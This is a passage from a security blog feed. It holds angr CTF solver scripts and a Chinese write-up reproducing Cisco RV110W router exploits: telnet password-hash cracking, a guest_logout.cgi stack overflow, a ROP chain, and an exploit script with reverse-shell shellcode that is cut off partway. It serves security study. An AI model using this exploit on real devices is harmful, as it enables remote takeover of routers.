class="string">&#x27;puts&#x27;</span>]())</span><br><span class="line"></span><br><span class="line">    initial_state = project.factory.entry_state()</span><br><span class="line">    simulation = project.factory.simgr(initial_state)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">good</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    simulation.explore(find=good)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        print(simulation.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="14-angr-shared-library"><a href="#14-angr-shared-library" class="headerlink" title="14_angr_shared_library"></a>14_angr_shared_library</h2><blockquote><p>The shared library has the function validate, which takes a string and returns either true (1) or false (0). The binary calls this function. If it returns true, the program prints “Good Job.” otherwise, it prints “Try again.”</p><p>Note: When you run this script, make sure you run it on lib14_angr_shared_library.so, not the executable. This level is intended to teach how to analyse binary formats that are not typical executables.</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># The shared library has the function validate, which takes a string and returns</span></span><br><span class="line"><span class="comment"># either true (1) or false (0). The binary calls this function. If it returns</span></span><br><span class="line"><span class="comment"># true, the program prints &quot;Good Job.&quot; otherwise, it prints &quot;Try again.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Note: When you run this script, make sure you run it on </span></span><br><span class="line"><span class="comment"># lib14_angr_shared_library.so, not the executable. This level is intended to </span></span><br><span class="line"><span class="comment"># teach how to analyse binary formats that are not typical executables.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">  <span class="comment"># The shared library is compiled with position-independent code. You will need</span></span><br><span class="line">  <span class="comment"># to specify the base address. All addresses in the shared library will be</span></span><br><span class="line">  <span class="comment"># base + offset, where offset is their address in the file.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  base = <span class="number">0x4000000</span></span><br><span class="line">  project = angr.Project(path_to_binary, load_options=&#123; </span><br><span class="line">    <span class="string">&#x27;main_opts&#x27;</span> : &#123; </span><br><span class="line">      <span class="string">&#x27;custom_base_addr&#x27;</span> : base </span><br><span class="line">    &#125; </span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Initialize any symbolic values here; you will need at least one to pass to</span></span><br><span class="line">  <span class="comment"># the validate function.</span></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Begin the state at the beginning of the validate function, as if it was</span></span><br><span class="line">  <span class="comment"># called by the program. Determine the parameters needed to call validate and</span></span><br><span class="line">  <span class="comment"># replace &#x27;parameters...&#x27; with bitvectors holding the values you wish to pass.</span></span><br><span class="line">  <span class="comment"># Recall that &#x27;claripy.BVV(value, size_in_bits)&#x27; constructs a bitvector </span></span><br><span class="line">  <span class="comment"># initialized to a single value.</span></span><br><span class="line">  <span class="comment"># Remember to add the base value you specified at the beginning to the</span></span><br><span class="line">  <span class="comment"># function address!</span></span><br><span class="line">  <span class="comment"># Hint: int validate(char* buffer, int length) &#123; ...</span></span><br><span class="line">  <span class="comment"># Another hint: the password is 8 bytes long.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  validate_function_address = <span class="number">0x6d7</span></span><br><span class="line">  buffer_pointer = claripy.BVV(<span class="number">0x3000000</span>, <span class="number">32</span>)</span><br><span class="line">  initial_state = project.factory.call_state(validate_function_address, buffer_pointer, claripy.BVV(<span class="number">8</span>, <span class="number">32</span>))</span><br><span class="line">  password = claripy.BVS(<span class="string">&#x27;password&#x27;</span>, <span class="number">8</span>*<span class="number">8</span>)</span><br><span class="line">  initial_state.memory.store(buffer_pointer, password)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># You will need to add code to inject a symbolic value into the program at the</span></span><br><span class="line">  <span class="comment"># end of the function that constrains eax to equal true (value of 1) just</span></span><br><span class="line">  <span class="comment"># before the function returns. There are multiple ways to do this:</span></span><br><span class="line">  <span class="comment"># 1. Use a hook.</span></span><br><span class="line">  <span class="comment"># 2. Search for the address just before the function returns and then</span></span><br><span class="line">  <span class="comment">#    constrain eax (this may require putting code elsewhere)</span></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  success_address =  base + <span class="number">0x783</span></span><br><span class="line">  simulation.explore(find=success_address)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">  </span><br><span class="line">    <span class="comment"># Determine where the program places the return value, and constrain it so</span></span><br><span class="line">    <span class="comment"># that it is true. Then, solve for the solution and print it.</span></span><br><span class="line">    <span class="comment"># (!)</span></span><br><span class="line">    pirnt(solution_state.solver.<span class="built_in">eval</span>(password, cast_to=<span class="built_in">bytes</span>))</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><h2 id="15-angr-arbitrary-read"><a href="#15-angr-arbitrary-read" class="headerlink" title="15_angr_arbitrary_read"></a>15_angr_arbitrary_read</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># You can either use a blank state or an entry state; just make sure to start</span></span><br><span class="line">  <span class="comment"># at the beginning of the program.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  initial_state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Again, scanf needs to be replaced.</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">ReplacementScanf</span>(<span class="params">angr.SimProcedure</span>):</span></span><br><span class="line">    <span class="comment"># Hint: scanf(&quot;%u %20s&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, format_string, param0, param1</span>):</span></span><br><span class="line">      <span class="comment"># %u</span></span><br><span class="line">      scanf0 = claripy.BVS(<span class="string">&#x27;scanf0&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">      </span><br><span class="line">      <span class="comment"># %20s</span></span><br><span class="line">      scanf1 = claripy.BVS(<span class="string">&#x27;scanf1&#x27;</span>, <span class="number">20</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">      <span class="comment"># The bitvector.chop(bits=n) function splits the bitvector into a Python</span></span><br><span class="line">      <span class="comment"># list containing the bitvector in segments of n bits each. In this case,</span></span><br><span class="line">      <span class="comment"># we are splitting them into segments of 8 bits (one byte.)</span></span><br><span class="line">      <span class="keyword">for</span> char <span class="keyword">in</span> scanf1.chop(bits=<span class="number">8</span>):</span><br><span class="line">        <span class="comment"># Ensure that each character in the string is printable. An interesting</span></span><br><span class="line">        <span class="comment"># experiment, once you have a working solution, would be to run the code</span></span><br><span class="line">        <span class="comment"># without constraining the characters to the printable range of ASCII.</span></span><br><span class="line">        <span class="comment"># Even though the solution will technically work without this, it&#x27;s more</span></span><br><span class="line">        <span class="comment"># difficult to enter in a solution that contains character you can&#x27;t</span></span><br><span class="line">        <span class="comment"># copy, paste, or type into your terminal or the web form that checks </span></span><br><span class="line">        <span class="comment"># your solution.</span></span><br><span class="line">        <span class="comment"># (!)</span></span><br><span class="line">        self.state.add_constraints(char &gt;= <span class="string">&#x27;A&#x27;</span>, char &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line"></span><br><span class="line">      <span class="comment"># Warning: Endianness only applies to integers. If you store a string in</span></span><br><span class="line">      <span class="comment"># memory and treat it as a little-endian integer, it will be backwards.</span></span><br><span class="line">      scanf0_address = param0</span><br><span class="line">      self.state.memory.store(scanf0_address, scanf0, endness=project.arch.memory_endness)</span><br><span class="line">      scanf1_address = param1</span><br><span class="line">      self.state.memory.store(scanf1_address, scanf1)</span><br><span class="line"></span><br><span class="line">      self.state.<span class="built_in">globals</span>[<span class="string">&#x27;solutions&#x27;</span>] = (scanf0, scanf1)</span><br><span class="line"></span><br><span class="line">  scanf_symbol = <span class="string">&#x27;__isoc99_scanf&#x27;</span>  <span class="comment"># :string</span></span><br><span class="line">  project.hook_symbol(scanf_symbol, ReplacementScanf())</span><br><span class="line"></span><br><span class="line">  <span class="comment"># We will call this whenever puts is called. The goal of this function is to</span></span><br><span class="line">  <span class="comment"># determine if the pointer passed to puts is controllable by the user, such</span></span><br><span class="line">  <span class="comment"># that we can rewrite it to point to the string &quot;Good Job.&quot;</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">check_puts</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="comment"># Treat the implementation of this function as if puts was just called.</span></span><br><span class="line">    <span class="comment"># The stack, registers, memory, etc should be set up as if the x86 call</span></span><br><span class="line">    <span class="comment"># instruction was just invoked (but, of course, the function hasn&#x27;t copied</span></span><br><span class="line">    <span class="comment"># the buffers yet.)</span></span><br><span class="line">    <span class="comment"># The stack will look as follows:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="comment"># esp + 7 -&gt; /----------------\</span></span><br><span class="line">    <span class="comment"># esp + 6 -&gt; |      puts      |</span></span><br><span class="line">    <span class="comment"># esp + 5 -&gt; |    parameter   |</span></span><br><span class="line">    <span class="comment"># esp + 4 -&gt; \----------------/</span></span><br><span class="line">    <span class="comment"># esp + 3 -&gt; /----------------\</span></span><br><span class="line">    <span class="comment"># esp + 2 -&gt; |     return     |</span></span><br><span class="line">    <span class="comment"># esp + 1 -&gt; |     address    |</span></span><br><span class="line">    <span class="comment">#     esp -&gt; \----------------/</span></span><br><span class="line">    <span class="comment"># (!)</span></span><br><span class="line">    puts_parameter = state.memory.load(state.regs.esp + <span class="number">4</span>, <span class="number">4</span>, endness=project.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># The following function takes a bitvector as a parameter and checks if it</span></span><br><span class="line">    <span class="comment"># can take on more than one value. While this does not necessary tell us we</span></span><br><span class="line">    <span class="comment"># have found an exploitable path, it is a strong indication that the </span></span><br><span class="line">    <span class="comment"># bitvector we checked may be controllable by the user.</span></span><br><span class="line">    <span class="comment"># Use it to determine if the pointer passed to puts is symbolic.</span></span><br><span class="line">    <span class="comment"># (!)</span></span><br><span class="line">    <span class="keyword">if</span> state.se.symbolic(puts_parameter):</span><br><span class="line">      <span class="comment"># Determine the location of the &quot;Good Job.\n&quot; string. We want to print it</span></span><br><span class="line">      <span class="comment"># out, and we will do so by attempting to constrain the puts parameter to</span></span><br><span class="line">      <span class="comment"># equal it. (Hint: look at .rodata).</span></span><br><span class="line">      <span class="comment"># (!)</span></span><br><span class="line">      good_job_string_address = <span class="number">0x594e4257</span> <span class="comment"># :integer, probably hexadecimal</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># Create an expression that will test if puts_parameter equals</span></span><br><span class="line">      <span class="comment"># good_job_string_address. If we add this as a constraint to our solver,</span></span><br><span class="line">      <span class="comment"># it will try and find an input to make this expression true.</span></span><br><span class="line">      <span class="comment"># (!)</span></span><br><span class="line">      is_vulnerable_expression = puts_parameter == good_job_string_address <span class="comment"># :boolean bitvector expression</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># Have Angr evaluate the state to determine if all the constraints can</span></span><br><span class="line">      <span class="comment"># be met, including the one we specified above. If it can be satisfied,</span></span><br><span class="line">      <span class="comment"># we have found our exploit!</span></span><br><span class="line">      </span><br><span class="line">      copied_state = state.copy()</span><br><span class="line"></span><br><span class="line">      copied_state.add_constraints(is_vulnerable_expression)</span><br><span class="line">       </span><br><span class="line">      <span class="keyword">if</span> copied_state.satisfiable():</span><br><span class="line">        <span class="comment"># Before we return, let&#x27;s add the constraint to the solver for real,</span></span><br><span class="line">        <span class="comment"># instead of just querying whether the constraint _could_ be added.</span></span><br><span class="line">        state.add_constraints(is_vulnerable_expression)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># not path.state.se.symbolic(???)</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="comment"># We are looking for puts. Check that the address is at the (very) beginning</span></span><br><span class="line">    <span class="comment"># of the puts function. Warning: while, in theory, you could look for</span></span><br><span class="line">    <span class="comment"># any address in puts, if you execute any instruction that adjusts the stack</span></span><br><span class="line">    <span class="comment"># pointer, the stack diagram above will be incorrect. Therefore, it is</span></span><br><span class="line">    <span class="comment"># recommended that you check for the very beginning of puts.</span></span><br><span class="line">    <span class="comment"># (!)</span></span><br><span class="line">    puts_address = <span class="number">0x8048370</span></span><br><span class="line">    <span class="keyword">if</span> state.addr == puts_address:</span><br><span class="line">      <span class="comment"># Return True if we determine this call to puts is exploitable.</span></span><br><span class="line">      <span class="keyword">return</span> check_puts(state)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="comment"># We have not yet found a call to puts; we should continue!</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Determine the situation in which you should avoid. Optionally, you can</span></span><br><span class="line">  <span class="comment"># remove the avoid parameter, although it may cause the program to run more</span></span><br><span class="line">  <span class="comment"># slowly.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  simulation.explore(find=is_successful)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    (scanf0, scanf1) = solution_state.<span class="built_in">globals</span>[<span class="string">&#x27;solutions&#x27;</span>]</span><br><span class="line">    solution = <span class="built_in">str</span>(solution_state.se.<span class="built_in">eval</span>(scanf0)) + <span class="string">&#x27; &#x27;</span> + solution_state.se.<span class="built_in">eval</span>(scanf1,cast_to=<span class="built_in">str</span>)</span><br><span class="line">    <span class="built_in">print</span> solution</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><p>(Not end…)</p>]]></content>
      
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> angr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网杯2020决赛 Cisco RV110W路由器复现</title>
      <link href="2021/08/31/Real-World-Cisco-RV110W/"/>
      <url>2021/08/31/Real-World-Cisco-RV110W/</url>
      
        <content type="html"><![CDATA[<h2 id="mips-基础知识"><a href="#mips-基础知识" class="headerlink" title="mips 基础知识"></a>mips 基础知识</h2><p>再次感谢轩哥和轩哥媳妇送的cheatsheet</p><p><img src="https://i.loli.net/2021/09/01/G8nwCeZhVcH54XE.png" alt=""></p><p>mips架构为RISC，常见的mips芯片流水线操作为五级</p><p><img src="https://i.loli.net/2021/05/09/2vwRVbPh7rODFoG.png" alt=""></p><p>IF = instruction fetch 指令提取阶段</p><p>ID = Instruction decode 指令译码阶段</p><p>EX = 执行阶段</p><p>MEM = 存储器访问阶段</p><p>WB = 寄存器写回阶段</p><blockquote><p>以i对应的时刻往后推移，最早的指令已经到了WB阶段，最新的指令正在进行指令提取。对于跳转/分支指令，当其到达执行阶段且新的程序计数器意已经产生时，紧随其后的下一条指令实际上已经开始执行了，mips规定分支之后的指令总是在分支目标指令之前进行，紧随分支指令之后的位置称为分支延迟槽，在没有任何可用操作时，延迟槽将填充nop占位。</p></blockquote><p>关于调用约定，常用的mips寄存器作用如下</p><blockquote><ul><li>“<code>$a0“</code> – “<code>$a3“</code>：函数调用时的参数传递，若参数超过 4 个，则多余的使用堆栈传递</li><li>“<code>$t0“</code>-“<code>$t7“</code>：临时寄存器</li><li>“<code>$s0“</code> – “<code>$s7“</code>：保存寄存器，使用时需将用到的寄存器保存到堆栈</li><li>“<code>$gp“</code>：全局指针，用于取数据（32K访问内）；“<code>$sp“</code>：栈指针，指向栈顶</li><li>“<code>$fp“</code>：栈帧指针；</li><li>“<code>$ra“</code>：存储返回地址；</li></ul></blockquote><p>其他的参见最上面的图:-)</p><p>比较重要的一点是，当本函数是叶子函数的时候（即不会再调用其他函数），ra寄存器是不会入栈的；非叶子函数的时候，ra寄存器入栈，有可以通过栈溢出来劫持控制流的机会。</p><h2 id="cisco路由器-RV110W-漏洞复现"><a href="#cisco路由器-RV110W-漏洞复现" class="headerlink" title="cisco路由器 RV110W 漏洞复现"></a>cisco路由器 RV110W 漏洞复现</h2><p>题目固件：<a href="https://xuanxuanblingbling.github.io/assets/attachment/RV110W_FW_1.2.2.5.bin">https://xuanxuanblingbling.github.io/assets/attachment/RV110W_FW_1.2.2.5.bin</a></p><p>虽然网上有docker环境可以用，但是还是建议买一个实体机，某鱼上有</p><h3 id="基础分析"><a href="#基础分析" class="headerlink" title="基础分析"></a>基础分析</h3><p>端口扫描，扫描常用端口，发现开了telnet，和web服务的端口，并且经过curl测试，80会重定向到443</p><p><img src="https://i.loli.net/2021/09/01/3DFOSYuKwQs5fUr.png" alt=""></p><p>固件解包，直接用binwalk，需要安装sasquatch以解开非标准的SquashFS文件系统</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev</span><br><span class="line">git clone https://github.com/devttys0/sasquatch</span><br><span class="line">(cd sasquatch &amp;&amp; ./build.sh)</span><br></pre></td></tr></table></figure><h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><p>根据xuanxuan师傅的描述，当时考虑是1day，就开始搜cve</p><p>在符合赛题要求的前提下找到三个相关漏洞CVE-2020-3330(telnet弱口令)，CVE-2020-3331 &amp; CVE-2020-3323(Web服务)</p><h4 id="telnet弱口令"><a href="#telnet弱口令" class="headerlink" title="telnet弱口令"></a>telnet弱口令</h4><p><a href="https://blogs.360.cn/post/yi-ge-zi-jie-cha-cuo-dao-zhi-Cisco-fang-huo-qiang-lu-you-qi-yuan-cheng-dai-ma-zhi-xing.html">https://blogs.360.cn/post/yi-ge-zi-jie-cha-cuo-dao-zhi-Cisco-fang-huo-qiang-lu-you-qi-yuan-cheng-dai-ma-zhi-xing.html</a></p><p>可以看到打码并没有打全2333</p><p><img src="https://pub1-bjyt.s3.360.cn/blog/20200806/upload_b4bfff83d434acd75557b6ef321ffad9.png" alt=""></p><p>全局搜索下这个字符串<code>find . | xargs grep -ri &quot;aUzX1IiE&quot;</code></p><p>发现匹配的都在sbin目录下，并且大多软连接到rc文件</p><p><img src="https://i.loli.net/2021/09/01/G5t8JTlPqnHKFL4.png" alt="ls -al _sbin.png"></p><p>直接strings rc，网上随便找个在线的hash解密网站一把梭</p><p><img src="https://i.loli.net/2021/09/01/qy49Ms62VhD85Jo.png" alt=""></p><p><img src="https://i.loli.net/2021/09/01/Cr6RDKjhkp8QEMz.png" alt=""></p><p>然后就可以telnet到路由器了，注意，明确一点，虽然getshell，但是，这只是方便我们本地调试，远程并没有开telnet服务，只有443端口开了</p><p><img src="https://i.loli.net/2021/09/01/XcwICEAyqMp3FiD.png" alt=""></p><h4 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h4><p>这两个cve都说的是web漏洞，所以我们要先找到web对应的binary</p><p>在浏览器端访问网址的时候，对应的url为10.10.10.1/login.cgi，所以全局搜索下</p><p><img src="https://i.loli.net/2021/09/01/bqBjpPylGvkrufQ.png" alt=""></p><p>只有httpd匹配</p><p>因为发现文件系统中有wget可以用，也可以利用本机起一个简单的http-server，通过telnet到路由器下载一个包含netstat的busybox，不过懒，就没搞</p><p>然后将二进制程序载入ida，因为有新版本的固件，使用diaphora diff一下</p><p>因为目标是前台getshell，所以guest_logout_cgi比较可疑，查看伪代码如下</p><p><img src="https://i.loli.net/2021/09/01/l34Iuxj5WenGtvV.png" alt=""></p><p><img src="https://i.loli.net/2021/09/01/fJTmyB6d3QcOFpX.png" alt=""></p><p>发现砍了sscanf</p><p>其中sscanf的条件<code>&quot;%[^;];%*[^=]=%[^\n]&quot;</code>里，% 表示选择，%* 表示过滤，中括号括起来的是类似正则</p><ol><li><code>%[^;]</code>：分号前的所有字符都要</li><li><code>;%*[^=]</code>：分号后，等号前的字符都不要</li><li><code>=%[^\n]</code>：等号后，换行符前的所有字符都要</li></ol><p>也就是说，如果输入字符串”aaa;bbb=ccc”，会将aaa和ccc写入对应变量，并没有限制长度，会导致栈溢出</p><p>分析一下如何到达这个sscanf所在分支</p><p><img src="https://i.loli.net/2021/09/01/K8ZUxf7tRiH3hJs.png" alt=""></p><ol><li>cmac：mac地址格式</li><li>cip：ipv4地址格式</li><li>submit_button：包含status_guestnet.asp字符串</li></ol><p>继续测试漏洞，通过发包测试来判断参数是通过GET参数传递还是通过POST参数来传递的</p><p>Get.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://10.10.10.1/guest_logout.cgi&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,<span class="string">&quot;submit_button&quot;</span>:<span class="string">&quot;status_guestnet.asp&quot;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span>,<span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.1.100&quot;</span>&#125;</span><br><span class="line">print(payload)</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line">requests.get(url, data=payload, verify=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>Post.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://10.10.10.1/guest_logout.cgi&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,<span class="string">&quot;submit_button&quot;</span>:<span class="string">&quot;status_guestnet.asp&quot;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span>,<span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.1.100&quot;</span>&#125;</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line">requests.post(url, data=payload, verify=<span class="literal">False</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>经过测试发现是通过post来传递参数的（post发过去就崩了，就像平常的pwn程序崩溃一样）</p><p>然后具体调试下，本地开个服务器，路由器作客户端下载个gdbserver过来</p><p><img src="https://i.loli.net/2021/09/01/9laSF1kdXDgLN6G.png" alt="http-server.png"></p><p>感谢海特实验室搜集的各种gdbserver，感谢X1ng师傅试出来gdbserver-7.12-mipsel-mips32rel2-v1-sysv可以用</p><p><a href="https://gitee.com/h4lo1/HatLab_Tools_Library/tree/master/%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F/gdbserver">https://gitee.com/h4lo1/HatLab_Tools_Library/tree/master/%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F/gdbserver</a></p><p>注意，下到tmp目录，其他目录不可写</p><p>通过ps查看httpd的进程号<code>ps | grep httpd</code>，然后gdbserver挂一下</p><p><img src="https://i.loli.net/2021/09/01/mNxIyWJlBsncj5F.png" alt="gdbserver.png"></p><p>然后远程gdb调remote</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb-multiarch -q httpd# quiet</span><br><span class="line">set arch mips</span><br><span class="line">set endian little</span><br><span class="line">target remote 10.10.10.1:1234</span><br><span class="line">c</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/01/5vOX2Dl3Zu4qfVz.png" alt=""></p><p>payload 用cyclic生成的字符一发打过去果然崩溃了</p><p><img src="https://i.loli.net/2021/09/01/Hpxh36LGen7zg9M.png" alt=""></p><p>算下偏移，注意到pc指针现在的值</p><p><img src="https://i.loli.net/2021/09/01/8HI9Qgd5XvSJ2Wb.png" alt=""></p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>mips架构硬件并不支持nx，所以利用方式通常为劫持程序流执行shellcode</p><p>由于sscanf栈溢出，所以不能有空字节，而程序本身的gadget都是有空字节的。。。</p><p>这时候自然想到用libc的gadget，但是，比较诡异的一点是，它的libc基址每次都不变：</p><blockquote><p>思科的这个设备，httpd进程的libc基址就是<code>2af98000</code>，无论你是重启进程，还是升级版本，这个基址都不变</p><p>问了常老师，再次猜测可能是为了效率，编译的时候就把内核的这个功能干掉了，或者当前平台压根就不支持这个功能。先存疑，总之我们发现动态库的基址都是不变的，故我们可以使用程序加载的动态库中的gadget。</p></blockquote><p>彳亍，那就用mipsrop来找gadget，虽然有很多动态库，但是选libc比较好，用ida加载/lib/libc.so.0</p><p>mipsrop.help()可查看用法</p><p>因为要控制register，所以找能将栈地址加载进寄存器的gadget</p><p>两条很有用的gadget</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">|  <span class="number">0x000257A0</span>  |  addiu $a0,$sp,<span class="number">0x58</span>+var_40  |  jalr  $s0  |</span><br><span class="line">|  <span class="number">0x0003D050</span>  |  move $t9,$a0  |  jalr  $a0  |</span><br></pre></td></tr></table></figure><p>利用手法：将shellcode写入到$sp + 0x10的位置处，然后覆盖s0为第二条gadget的地址，将ra寄存器覆盖为第一条gadget的地址</p><p>这样会造成什么效果呢？程序返回时，程序执行流被控制为0x257a0，去执行第一条gadget，a0 = sp + 0x18，jmp到s0寄存器，s0寄存器存的是第二条gadget，继而去执行第二条gadget，将a0放到t9，然后jmp到a0，a0存的是shellcode的地址，于是程序就会执行shellcode</p><p>shellcode生成用msfvenom，生成的shellcode没有\x00字节的存在，生成一个回连的shell</p><p><img src="https://i.loli.net/2021/09/01/wBACxIlp8Wh3vc9.png" alt="msf.png"></p><p><img src="https://i.loli.net/2021/09/01/3svj6DSaBwnLRmE.png" alt=""></p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;mips&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">libc = <span class="number">0x2af98000</span></span><br><span class="line">jmp_a0 = libc + <span class="number">0x0003D050</span>  <span class="comment"># move  $t9,$a0             ; jalr  $a0</span></span><br><span class="line">jmp_s0 = libc + <span class="number">0x000257A0</span>  <span class="comment"># addiu $a0,$sp,0x38+var_20 ; jalr  $s0</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f\xfd\xff\x0f&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf\x22\xb8\x0e\x3c&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x22\xb8\xce\x35\xe4\xff\xae\xaf\x0a\x64\x0e\x3c\x0a&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x0a\xce\x35\xe6\xff\xae\xaf\xe2\xff\xa5\x27\xef\xff&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24\x0c\x01\x01&quot;</span></span><br><span class="line">shellcode += <span 